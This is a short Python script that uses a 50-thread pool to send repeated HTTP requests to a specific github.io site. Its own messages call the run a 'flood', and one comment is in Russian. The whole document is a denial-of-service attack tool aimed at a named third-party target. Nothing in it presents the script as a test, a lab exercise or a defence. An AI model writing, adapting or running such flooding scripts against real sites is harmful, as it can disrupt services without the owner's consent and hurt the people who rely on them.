import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys

target = "https://srabakio.github.io/"
threads = 50

def hit_target(_):
    try:
        response = requests.get(target, timeout=5)
        return response.status_code
    except Exception:
        return 0

print(f"Starting flood with {threads} threads...")

with ThreadPoolExecutor(max_workers=threads) as executor:
    for _ in range(100):
        # Запускаем пул запросов
        list(executor.map(hit_target, range(threads)))
        time.sleep(0.1)

print("Flood completed successfully.")
